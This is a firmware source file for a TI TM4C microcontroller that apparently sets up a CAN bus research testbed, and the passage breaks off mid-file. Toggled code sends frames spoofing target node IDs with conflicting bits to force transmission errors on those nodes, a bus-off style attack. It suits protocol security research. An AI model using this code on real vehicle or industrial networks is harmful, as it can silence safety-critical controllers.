//*****************************************************************************
//
// timers.c - Timers example.
// can.c - Simple CAN example.
//
// Copyright (c) 2013-2017 Texas Instruments Incorporated.  All rights reserved.
// Software License Agreement
// 
// Texas Instruments (TI) is supplying this software for use solely and
// exclusively on TI's microcontroller products. The software is owned by
// TI and/or its suppliers, and is protected under applicable copyright
// laws. You may not combine this software with "viral" open-source
// software in order to form a larger program.
// 
// THIS SOFTWARE IS PROVIDED "AS IS" AND WITH ALL FAULTS.
// NO WARRANTIES, WHETHER EXPRESS, IMPLIED OR STATUTORY, INCLUDING, BUT
// NOT LIMITED TO, IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
// A PARTICULAR PURPOSE APPLY TO THIS SOFTWARE. TI SHALL NOT, UNDER ANY
// CIRCUMSTANCES, BE LIABLE FOR SPECIAL, INCIDENTAL, OR CONSEQUENTIAL
// DAMAGES, FOR ANY REASON WHATSOEVER.
// 
// This is part of revision 2.1.4.178 of the EK-TM4C129EXL Firmware Package.
// This is part of revision 2.1.4.178 of the DK-TM4C123G Firmware Package.
//
//*****************************************************************************

#include <stdint.h>
#include <stdbool.h>
#include "inc/hw_can.h"
#include "inc/hw_ints.h"
#include "inc/hw_memmap.h"
#include "inc/hw_types.h"
#include "driverlib/debug.h"
#include "driverlib/fpu.h"
#include "driverlib/can.h"
#include "driverlib/gpio.h"
#include "driverlib/interrupt.h"
#include "driverlib/pin_map.h"
#include "driverlib/rom.h"
#include "driverlib/rom_map.h"
#include "driverlib/sysctl.h"
#include "driverlib/timer.h"
#include "driverlib/uart.h"
#include "utils/uartstdio.h"


//*****************************************************************************
//
// A counter that keeps track of the number of times the TX & RX interrupt has
// occurred, which should match the number of messages that were transmitted /
// received.
//
//*****************************************************************************
volatile uint32_t g_ui32RXMsgCount = 0;
volatile uint32_t g_ui32TXMsgCount = 0;
volatile uint32_t g_ui32TXHighMsgCount = 0;
volatile uint32_t g_ui32TXMidMsgCount = 0;

volatile uint32_t g_ui32TXCount = 0;
volatile uint32_t g_ui32RXCount = 0;

volatile uint32_t g_target_id = 0;

//*****************************************************************************
//
// A flag for the interrupt handler to indicate that a message was received.
//
//*****************************************************************************
volatile bool g_bRXFlag = 0;
volatile bool g_bTXFlag = 0;

volatile bool g_tick = false;

volatile uint8_t g_sync = 0;
volatile uint8_t g_reset = 0;

volatile uint8_t g_msg_since_idle = 0;
volatile uint8_t g_sync_since_idle = 255;


/* experimental controls */

#define VERBOSE

//#define SEND_EXTRA 2



//#define ATTACK

//#define TRANSITIVE_ATTACK
#define TARGET_ID_2 (0x09)

// set SKIP_ATTACK to 2 for 1 skip, 3 to skip 2, etc.
#define SKIP_ATTACK (5)
#define SKIP_ATTACK_2 (2)
volatile uint8_t g_skip_attack = SKIP_ATTACK;

#define RECESSIVE_ATTACK

/* Synchronization control */
//#define SYNC_0PHASE
//#define SYNC_PERIOD

/* Retransmission control */
//#define RETRANSMIT
//#define DISABLE_AUTO
#define DISABLE_ABORT_TX_ERROR
//#define DISABLE_ABORT_RX_PRECEDED
//#define DISABLE_ABORT_RX_PRECEDED_INT



//*****************************************************************************
//
// A global to keep track of the error flags that have been thrown so they may
// be processed. This is necessary because reading the error register clears
// the flags, so it is necessary to save them somewhere for processing.
//
//*****************************************************************************
volatile uint32_t g_ui32ErrFlag = 0;

//*****************************************************************************
//
// CAN message Objects for data being sent / received
//
//*****************************************************************************
tCANMsgObject g_sCAN0RxMessage;

#if defined(DISABLE_ABORT_RX_PRECEDED_INT)
tCANMsgObject g_sCAN0RxMessage2;
#endif

tCANMsgObject g_sCAN0TxMessage_5;

#if defined(ATTACK)
tCANMsgObject g_sCAN0TxMessage_5A1;
#endif

#if defined(SEND_EXTRA)
tCANMsgObject g_sCAN0TxMessage_5C1;
tCANMsgObject g_sCAN0TxMessage_5C2;
#endif

#if defined(TRANSITIVE_ATTACK)
tCANMsgObject g_sCAN0TxMessage_5A2;
#endif

tCANMsgObject g_sCAN0TxMessage_10;
tCANMsgObject g_sCAN0TxMessage_100;
tCANMsgObject g_sCAN0TxMessage_1000;

//*****************************************************************************
//
// Message Identifiers and Objects
//
//*****************************************************************************

#define RXOBJECT             16
#define RXOBJECT2            15

#define TXOBJECT_5A1    4
#define TXOBJECT_5A2    5

#define TXOBJECT_5           3

#define TXOBJECT_5C1    6
#define TXOBJECT_5C2    7

#define TXOBJECT_10          8

#define TXOBJECT_100        10

#define TXOBJECT_1000        12

#define TARGET_ID (0xA1)
#define PRECEDED_ID (0xA0)

//---------

#define BITRATE (500000)

#define INTERVAL (600000) /* 5 ms */

#define DIFFERENCE (0) // ((44*120000)/(BITRATE/1000)) /* approximately 1 0-byte message transmission time */

#define LATENCY_8B_MAX ((129*120000)/(BITRATE/1000)) /* maximum message latency */

//*****************************************************************************
//
// Variables to hold character being sent / reveived
//
//*****************************************************************************

#if defined(RECESSIVE_ATTACK)
uint8_t g_ui8TXMsgData_5A1[2] = { 0xE6, 0x7C };
#else
uint8_t g_ui8TXMsgData_5A1[1] = { 0x66 };
#endif

uint8_t g_ui8TXMsgData_5[2] = { 0x66, 0x7C };
uint8_t g_ui8TXMsgData_10[6] = { 0xAF, 0xBC };
uint8_t g_ui8TXMsgData_100[1] = { 0xC0 };

#if defined(SEND_EXTRA)
uint8_t g_ui8TXMsgData_5C1[1] = { 0xC0 };
uint8_t g_ui8TXMsgData_5C2[8] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 };
#endif

#if defined(TRANSITIVE_ATTACK)
uint8_t g_ui8TXMsgData_5A2[8] = { 0x81, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 };
#endif

uint8_t g_ui8TXMsgData_1000[1] = { 0xFF };

int8_t g_ui8RXMsgData[8];

volatile uint32_t g_x;
volatile uint32_t g_y;

//*****************************************************************************
//
// CAN 0 Interrupt Handler. It checks for the cause of the interrupt, and
// maintains a count of all messages that have been transmitted / received
//
//*****************************************************************************
void
CAN0IntHandler(void)
{
    uint32_t ui32Status;

#if defined(SYNC_0PHASE)
    uint32_t timer_val;
#endif

    ROM_IntMasterDisable();

    //
    // Read the CAN interrupt status to find the cause of the interrupt
    //
    // CAN_INT_STS_CAUSE register values
    // 0x0000        = No Interrupt Pending
    // 0x0001-0x0020 = Number of message object that caused the interrupt
    // 0x8000        = Status interrupt
    // all other numbers are reserved and have no meaning in this system
    //
    ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE);

    //
    // If this was a status interrupt acknowledge it by reading the CAN
    // controller status register.
    //
    if(ui32Status == CAN_INT_INTID_STATUS)
    {
        //
        // Read the controller status.  This will return a field of status
        // error bits that can indicate various errors. Refer to the
        // API documentation for details about the error status bits.
        // The act of reading this status will clear the interrupt.
        //
        ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);

#if defined(DISABLE_ABORT_TX_ERROR)
        uint8_t lec = ui32Status & CAN_STATUS_LEC_MSK;
        if ( lec == CAN_STATUS_LEC_STUFF || lec == CAN_STATUS_LEC_BIT1 || lec == CAN_STATUS_LEC_BIT0 ) {
            if (g_target_id == TARGET_ID ) {
                CANMessageClear(CAN0_BASE, TXOBJECT_5A1);
            } else {
#if defined(TRANSITIVE_ATTACK)
                CANMessageClear(CAN0_BASE, TXOBJECT_5A2);
#endif
            }
        }
#endif

        //
        // Add ERROR flags to list of current errors. To be handled
        // later, because it would take too much time here in the
        // interrupt.
        //
        g_ui32ErrFlag |= ui32Status;
    }

    //
    // Check if the cause is message object RXOBJECT, which we are using
    // for receiving messages.
    //
    else if(ui32Status == RXOBJECT)
    {
        CANIntClear(CAN0_BASE, RXOBJECT);

        g_bRXFlag = true;

#if defined(SYNC_0PHASE)
            timer_val = TimerLoadGet(TIMER1_BASE, TIMER_A);
            TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY_8B_MAX);
            if (timer_val == 0) {
                ROM_TimerEnable(TIMER1_BASE, TIMER_A);
                g_msg_since_idle = 0;
            } else {
                g_msg_since_idle++;
            }
#endif

        g_ui32ErrFlag = 0;
    }

    else if(ui32Status == RXOBJECT2) {
        CANIntClear(CAN0_BASE, RXOBJECT2);
        g_bRXFlag = true;
#if defined(DISABLE_ABORT_RX_PRECEDED_INT)
            CANMessageClear(CAN0_BASE, TXOBJECT_5);
#endif
    }

    else if(ui32Status == TXOBJECT_5)
    {
        CANIntClear(CAN0_BASE, TXOBJECT_5);
        g_ui32TXMsgCount++;
        g_bTXFlag = true;
        g_ui32ErrFlag = 0;
    }
    else if (ui32Status == TXOBJECT_5C1) {
            CANIntClear(CAN0_BASE, TXOBJECT_5C1);
            g_bTXFlag = true;
            g_ui32ErrFlag = 0;
        }
        else if (ui32Status == TXOBJECT_5C2) {
            CANIntClear(CAN0_BASE, TXOBJECT_5C2);
            g_bTXFlag = true;
            g_ui32ErrFlag = 0;
        }
   else if (ui32Status == TXOBJECT_5A1) {
            CANIntClear(CAN0_BASE, TXOBJECT_5A1);
            g_bTXFlag = true;
            g_ui32ErrFlag = 0;
   }
    else if (ui32Status == TXOBJECT_5A2) {
        CANIntClear(CAN0_BASE, TXOBJECT_5A2);
        g_bTXFlag = true;
        g_ui32ErrFlag = 0;
    }
    else if (ui32Status == TXOBJECT_10) {
        CANIntClear(CAN0_BASE, TXOBJECT_10);
        g_ui32ErrFlag = 0;
    }
    else if (ui32Status == TXOBJECT_100) {
            CANIntClear(CAN0_BASE, TXOBJECT_100);
            g_bTXFlag = true;
            g_ui32ErrFlag = 0;
        }
    else if (ui32Status == TXOBJECT_1000) {
        g_reset = 2;
        CANIntClear(CAN0_BASE, TXOBJECT_1000);
        g_ui32ErrFlag = 0;
    }
    else
    {
        CANIntClear(CAN0_BASE, ui32Status);
        g_ui32ErrFlag = 0;
    }
    ROM_IntMasterEnable();
}

//****************************************************************************
//
// System clock rate in Hz.
//
//****************************************************************************
uint32_t g_ui32SysClock;

//*****************************************************************************
//
// Flags that contain the current value of the interrupt indicator as displayed
// on the UART.
//
//*****************************************************************************
uint32_t g_ui32Flags;

//*****************************************************************************
//
// The error routine that is called if the driver library encounters an error.
//
//*****************************************************************************
#ifdef DEBUG
void
__error__(char *pcFilename, uint32_t ui32Line)
{
}
#endif

void
send_messages(uint32_t count)
{
    static uint16_t skip_cnt = 0;

#if defined(ATTACK)
    if ( count % 2 == 0 ) {
        if ( g_sync == 1 && g_reset == 0 ) {
            if ( skip_cnt % g_skip_attack == 0 ) {
               if ( g_target_id == TARGET_ID ) {
                    CANMessageSet(CAN0_BASE, TXOBJECT_5A1, &g_sCAN0TxMessage_5A1, MSG_OBJ_TYPE_TX);
                } else {
#if defined(TRANSITIVE_ATTACK)
                    CANMessageSet(CAN0_BASE, TXOBJECT_5A2, &g_sCAN0TxMessage_5A2, MSG_OBJ_TYPE_TX);
#endif
                }
            }
            ++skip_cnt;
        } else {
            skip_cnt = 0;
        }
    }
#endif

#if defined(SEND_EXTRA)
    if ( count % 2 == 1 ) {
        CANMessageSet(CAN0_BASE, TXOBJECT_5C1, &g_sCAN0TxMessage_5C1, MSG_OBJ_TYPE_TX);
        CANMessageSet(CAN0_BASE, TXOBJECT_5C2, &g_sCAN0TxMessage_5C2, MSG_OBJ_TYPE_TX);
    }
#endif

#if defined(SEND_A)
    if ( count % 3500 == 0) {
        UARTprintf("\tRESET\n");
        ResetCAN0();
        g_reset = 0;
        CANMessageSet(CAN0_BASE, TXOBJECT_1000, &g_sCAN0TxMessage_1000, MSG_OBJ_TYPE_TX);
    }
#endif


    if ( g_reset == 0 ) {
        CANMessageSet(CAN0_BASE, TXOBJECT_5, &g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);

#if 0
        if ( count % 2 == 0 ) {
            CANMessageSet(CAN0_BASE, TXOBJECT_10, &g_sCAN0TxMessage_10, MSG_OBJ_TYPE_TX);
        }
#endif

        if (count % 20 == 0 ) {
            CANMessageSet(CAN0_BASE, TXOBJECT_100, &g_sCAN0TxMessage_100, MSG_OBJ_TYPE_TX);
        }

        if ( count % 200 == 0 ) {
#if 0
            CANMessageSet(CAN0_BASE, TXOBJECT_1000, &g_sCAN0TxMessage, MSG_OBJ_TYPE_TX);
#endif

            HWREGBITW(&g_ui32Flags, 0) ^= 1;
            GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_0, g_ui32Flags);
        }
    }
}

void
Timer0IntHandler(void)
{
    ROM_TimerIntClear(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
    g_tick = true;

#if defined(SYNC_0PHASE) || defined(SYNC_PERIOD)
    if (g_sync == 2) {
        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);

        //if (g_sync_since_idle < 4) {
            g_sync = 1;
        //} else {
        //    g_sync = 0;
        //}
    }
#else
    g_sync = 1;
#endif

}

void
Timer1IntHandler(void)
{
    //uint32_t count;

    ROM_TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);

    TimerEnable(TIMER0_BASE, TIMER_A);
}

void ResetCAN0(void)
{
    CANInit(CAN0_BASE);

#if defined(DISABLE_AUTO)
        CANRetrySet(CAN0_BASE, false);
#endif

    CANBitRateSet(CAN0_BASE, g_ui32SysClock, BITRATE);
    CANIntEnable(CAN0_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);
    IntEnable(INT_CAN0);
    CANEnable(CAN0_BASE);
    CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);
}

void
InitCAN0(void)
{
    //
    // For this example CAN0 is used with RX and TX pins on port A0 and A1.
    // GPIO port A needs to be enabled so these pins can be used.
    //
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOA);

    //
    // Configure the GPIO pin muxing to select CAN0 functions for these pins.
    // This step selects which alternate function is available for these pins.
    //
    GPIOPinConfigure(GPIO_PA0_CAN0RX);
    GPIOPinConfigure(GPIO_PA1_CAN0TX);

    //
    // Enable the alternate function on the GPIO pins.  The above step selects
    // which alternate function is available.  This step actually enables the
    // alternate function instead of GPIO for these pins.
    //
    GPIOPinTypeCAN(GPIO_PORTA_BASE, GPIO_PIN_0 | GPIO_PIN_1);

    //
    // The GPIO port and pins have been set up for CAN.  The CAN peripheral
    // must be enabled.
    //
    SysCtlPeripheralEnable(SYSCTL_PERIPH_CAN0);

    //
    // Initialize the CAN controller
    //
    CANInit(CAN0_BASE);

#if defined(DISABLE_AUTO)
        CANRetrySet(CAN0_BASE, false);
#endif

    //
    // Set up the bit rate for the CAN bus.  This function sets up the CAN
    // bus timing for a nominal configuration.  You can achieve more control
    // over the CAN bus timing by using the function CANBitTimingSet() instead
    // of this one, if needed.
    // In this example, the CAN bus is set to 125 kHz.
    //
    CANBitRateSet(CAN0_BASE, g_ui32SysClock, BITRATE);

    //
    // Enable interrupts on the CAN peripheral.  This example uses static
    // allocation of interrupt handlers which means the name of the handler
    // is in the vector table of startup code.
    //
    CANIntEnable(CAN0_BASE, CAN_INT_MASTER | CAN_INT_ERROR | CAN_INT_STATUS);

    //
    // Enable the CAN interrupt on the processor (NVIC).
    //
    IntEnable(INT_CAN0);

#if 0
    // Loopback Test
    HWREG(CAN0_BASE + CAN_O_CTL) |= CAN_CTL_TEST;
    HWREG(CAN0_BASE + CAN_O_TST) |= CAN_TST_LBACK;
#endif

    //
    // Enable the CAN for operation.
    //
    CANEnable(CAN0_BASE);

    //
    // Initialize a message object to be used for receiving CAN messages with
    // any CAN ID.  In order to receive any CAN ID, the ID and mask must both
    // be set to 0, and the ID filter enabled.
    //
    g_sCAN0RxMessage.ui32MsgID = 0;
    g_sCAN0RxMessage.ui32MsgIDMask = 0;
    g_sCAN0RxMessage.ui32Flags = MSG_OBJ_RX_INT_ENABLE | MSG_OBJ_USE_ID_FILTER;
    g_sCAN0RxMessage.ui32MsgLen = sizeof(g_ui8RXMsgData);
    CANMessageSet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, MSG_OBJ_TYPE_RX);

#if defined(DISABLE_ABORT_RX_PRECEDED_INT)
    g_sCAN0RxMessage2.ui32MsgID = PRECEDED_ID;
    g_sCAN0RxMessage2.ui32MsgIDMask = PRECEDED_ID;
    g_sCAN0RxMessage2.ui32Flags = MSG_OBJ_RX_INT_ENABLE | MSG_OBJ_USE_ID_FILTER;
    g_sCAN0RxMessage2.ui32MsgLen = sizeof(g_ui8RXMsgData);
    CANMessageSet(CAN0_BASE, RXOBJECT2, &g_sCAN0RxMessage2, MSG_OBJ_TYPE_RX);
#endif

    /* TX Objects */


    g_sCAN0TxMessage_5.ui32MsgID = 0xA1;
    g_sCAN0TxMessage_5.ui32MsgIDMask = 0;
    g_sCAN0TxMessage_5.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessage_5.ui32MsgLen = sizeof(g_ui8TXMsgData_5);
    g_sCAN0TxMessage_5.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5;

#if 0
    g_sCAN0TxMessage_10.ui32MsgID = 0xB3;
    g_sCAN0TxMessage_10.ui32MsgIDMask = 0;
    g_sCAN0TxMessage_10.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessage_10.ui32MsgLen = sizeof(g_ui8TXMsgData_10);
    g_sCAN0TxMessage_10.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_10;
#endif

    g_sCAN0TxMessage_100.ui32MsgID = 0xC1;
    g_sCAN0TxMessage_100.ui32MsgIDMask = 0;
    g_sCAN0TxMessage_100.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessage_100.ui32MsgLen = sizeof(g_ui8TXMsgData_100);
    g_sCAN0TxMessage_100.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_100;

#if defined(SEND_A)
    g_sCAN0TxMessage_1000.ui32MsgID = 0xFF;
    g_sCAN0TxMessage_1000.ui32MsgIDMask = 0;
    g_sCAN0TxMessage_1000.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessage_1000.ui32MsgLen = sizeof(g_ui8TXMsgData_1000);
    g_sCAN0TxMessage_1000.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_1000;
#endif

#if defined(ATTACK)
    g_sCAN0TxMessage_5A1.ui32MsgID = TARGET_ID;
    g_sCAN0TxMessage_5A1.ui32MsgIDMask = 0;
    g_sCAN0TxMessage_5A1.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessage_5A1.ui32MsgLen = sizeof(g_ui8TXMsgData_5A1);
    g_sCAN0TxMessage_5A1.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5A1;
#endif

#if defined(TRANSITIVE_ATTACK)
    g_sCAN0TxMessage_5A2.ui32MsgID = TARGET_ID_2;
    g_sCAN0TxMessage_5A2.ui32MsgIDMask = 0;
    g_sCAN0TxMessage_5A2.ui32Flags = MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessage_5A2.ui32MsgLen = sizeof(g_ui8TXMsgData_5A2);
    g_sCAN0TxMessage_5A2.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5A2;
#endif

#if defined(SEND_EXTRA)
    g_sCAN0TxMessage_5C1.ui32MsgID = 0x33;
    g_sCAN0TxMessage_5C1.ui32MsgIDMask = 0;
    g_sCAN0TxMessage_5C1.ui32Flags = 0; //MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessage_5C1.ui32MsgLen = sizeof(g_ui8TXMsgData_5C1);
    g_sCAN0TxMessage_5C1.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5C1;

    g_sCAN0TxMessage_5C2.ui32MsgID = 0x44;
    g_sCAN0TxMessage_5C2.ui32MsgIDMask = 0;
    g_sCAN0TxMessage_5C2.ui32Flags = 0; //MSG_OBJ_TX_INT_ENABLE;
    g_sCAN0TxMessage_5C2.ui32MsgLen = sizeof(g_ui8TXMsgData_5C2);
    g_sCAN0TxMessage_5C2.pui8MsgData = (uint8_t *)&g_ui8TXMsgData_5C2;
#endif

}

//*****************************************************************************
//
// Can ERROR handling. When a message is received if there is an erro it is
// saved to g_ui32ErrFlag, the Error Flag Set. Below the flags are checked
// and cleared. It is left up to the user to add handling fuctionality if so
// desiered.
//
// For more information on the error flags please see the CAN section of the
// microcontroller datasheet.
//
// NOTE: you may experience errors during setup when only one board is powered
// on. This is caused by one board sending signals and there not being another
// board there to acknoledge it. Dont worry about these errors, they can be
// disregarded.
//
//*****************************************************************************
void
CANErrorHandler(void)
{
    //
    // CAN controller has entered a Bus Off state.
    //
    if(g_ui32ErrFlag & CAN_STATUS_BUS_OFF)
    {
        uint32_t ui32Status;
        //
        // Handle Error Condition here
        //
        UARTprintf("ERROR: CAN_STATUS_BUS_OFF\n");

        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, 1);
        CANEnable(CAN0_BASE);
        do {
            ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);
        } while ( ui32Status & CAN_STATUS_BUS_OFF);
        g_reset = 1;

        GPIOPinWrite(GPIO_PORTN_BASE, GPIO_PIN_0, 0);

        //
        // Clear CAN_STATUS_BUS_OFF Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_BUS_OFF);
    }

    //
    // CAN controller error level has reached warning level.
    //
    if(g_ui32ErrFlag & CAN_STATUS_EWARN)
    {
        //
        // Handle Error Condition here
        //
        //UARTprintf("    ERROR: CAN_STATUS_EWARN \n");
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 1);

        //
        // Clear CAN_STATUS_EWARN Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_EWARN);
    } else {
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 0);
    }

    //
    // CAN controller error level has reached error passive level.
    //
    if(g_ui32ErrFlag & CAN_STATUS_EPASS)
    {
        //
        // Handle Error Condition here
        //
        GPIOPinWrite(GPIO_PORTF_BASE, GPIO_PIN_4, 1);
        //CANRetrySet(CAN0_BASE, false);

        //
        // Clear CAN_STATUS_EPASS Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_EPASS);
    }

    //
    // A message was received successfully since the last read of this status.
    //
    if(g_ui32ErrFlag & CAN_STATUS_RXOK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_RXOK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_RXOK);
    }

    //
    // A message was transmitted successfully since the last read of this
    // status.
    //
    if(g_ui32ErrFlag & CAN_STATUS_TXOK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_TXOK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_TXOK);
    }

    //
    // This is the mask for the last error code field.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_MSK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_MSK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_MSK);
    }

    //
    // A bit stuffing error has occurred.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_STUFF)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_STUFF Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_STUFF);
    }

    //
    // A formatting error has occurred.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_FORM)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_FORM Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_FORM);
    }

    //
    // An acknowledge error has occurred.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_ACK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_ACK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_ACK);
    }

    //
    // The bus remained a bit level of 1 for longer than is allowed.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_BIT1)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_BIT1 Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_BIT1);
    }

    //
    // The bus remained a bit level of 0 for longer than is allowed.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_BIT0)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_BIT0 Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_BIT0);
    }

    //
    // A CRC error has occurred.
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_CRC)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_CRC Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_CRC);
    }

    //
    // This is the mask for the CAN Last Error Code (LEC).
    //
    if(g_ui32ErrFlag & CAN_STATUS_LEC_MASK)
    {
        //
        // Handle Error Condition here
        //

        //
        // Clear CAN_STATUS_LEC_MASK Flag
        //
        g_ui32ErrFlag &= ~(CAN_STATUS_LEC_MASK);
    }

    //
    // If there are any bits still set in g_ui32ErrFlag then something unhandled
    // has happened. Print the value of g_ui32ErrFlag.
    //
    if(g_ui32ErrFlag !=0)
    {
        //UARTprintf("    Unhandled ERROR: %x \n",g_ui32ErrFlag);
    }
}

void
ConfigureUART2(void)
{
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOD);
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_UART2);
    ROM_GPIOPinConfigure(GPIO_PD4_U2RX);
    ROM_GPIOPinConfigure(GPIO_PD5_U2TX);
    ROM_GPIOPinTypeUART(GPIO_PORTD_BASE, GPIO_PIN_4 | GPIO_PIN_5);
    UARTStdioConfig(2, 115200, g_ui32SysClock);
}

int
main(void)
{
    int count;
    uint32_t rec, tec;

    //
    // Enable lazy stacking for interrupt handlers.  This allows floating-point
    // instructions to be used within interrupt handlers, but at the expense of
    // extra stack usage.
    //
    //ROM_FPULazyStackingEnable();

    //
    // Set the clocking to run directly from the crystal at 120MHz.
    //
    g_ui32SysClock = SysCtlClockFreqSet((SYSCTL_XTAL_25MHZ |
                                             SYSCTL_OSC_MAIN |
                                             SYSCTL_USE_PLL |
                                             SYSCTL_CFG_VCO_480), 120000000);


    //
    // Enable the GPIO port that is used for the on-board LEDs.
    //
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_GPION);
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOF);

    //
    // Enable the GPIO pins for the LEDs (PN0 & PN1).
    //
    ROM_GPIOPinTypeGPIOOutput(GPIO_PORTN_BASE, GPIO_PIN_0 | GPIO_PIN_1);
    ROM_GPIOPinTypeGPIOOutput(GPIO_PORTF_BASE, GPIO_PIN_0 | GPIO_PIN_4);

    //
    // Enable the peripherals used by this example.
    //
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER0);
    ROM_SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER1);

    //
    // Enable processor interrupts.
    //
    ROM_IntMasterEnable();
    IntMasterEnable();


    ROM_TimerConfigure(TIMER0_BASE, TIMER_CFG_PERIODIC);
    ROM_TimerConfigure(TIMER1_BASE, TIMER_CFG_A_ONE_SHOT);
    //TimerConfigure(TIMER0_BASE, TIMER_CFG_A_ONE_SHOT);
    ROM_TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
    IntEnable(INT_TIMER0A);
    TimerIntEnable(TIMER0_BASE, TIMER_TIMA_TIMEOUT);

    InitCAN0();

    ConfigureUART2();

    ROM_TimerEnable(TIMER0_BASE, TIMER_A);


#if defined(SYNC_0PHASE)
        TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY_8B_MAX);
        //IntEnable(INT_TIMER1A);
        //TimerIntEnable(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
        ROM_TimerEnable(TIMER1_BASE, TIMER_A);
#endif

    g_target_id = TARGET_ID;

    //
    // Loop forever while the timers run.
    //
    while(1)
    {
        if( g_tick == true ) {
            g_tick = false;

            send_messages(++count);
        }

        if (g_bTXFlag) {

#if defined(SEND_A)
            if (g_reset == 2) {
                UARTprintf("%d\tRESET\n", count);
                g_sync = 1;
                g_reset = 0;
                ResetCAN0();
                TimerLoadSet(TIMER1_BASE, TIMER_A, LATENCY_8B_MAX);
                ROM_TimerEnable(TIMER1_BASE, TIMER_A);
            }
#endif

            CANErrCntrGet(CAN0_BASE, &rec, &tec);
            UARTprintf("%d\tTX\tREC\t%u\tTEC\t%u\n", count, rec, tec);
            g_bTXFlag = false;

            g_target_id = TARGET_ID_2;
            g_sync = 4;
            g_skip_attack = SKIP_ATTACK_2;
        }

        //
        // If the flag is set, that means that the RX interrupt occurred and
        // there is a message ready to be read from the CAN
        //
        if(g_bRXFlag)
        {
            //
            // Reuse the same message object that was used earlier to configure
            // the CAN for receiving messages.  A buffer for storing the
            // received data must also be provided, so set the buffer pointer
            // within the message object.
            //
            g_sCAN0RxMessage.pui8MsgData = (uint8_t *) &g_ui8RXMsgData;

            //
            // Read the message from the CAN.  Message object RXOBJECT is used
            // (which is not the same thing as CAN ID).  The interrupt clearing
            // flag is not set because this interrupt was already cleared in
            // the interrupt handler.
            //
            CANMessageGet(CAN0_BASE, RXOBJECT, &g_sCAN0RxMessage, 0);


            //
            // Clear the pending message flag so that the interrupt handler can
            // set it again when the next message arrives.
            //
            g_bRXFlag = 0;

            //
            // Check to see if there is an indication that some messages were
            // lost.
            //
            if(g_sCAN0RxMessage.ui32Flags & MSG_OBJ_DATA_LOST)
            {
            //    UARTprintf("\nCAN message loss detected\n");
            }

#if defined(DISABLE_ABORT_RX_PRECEDED)
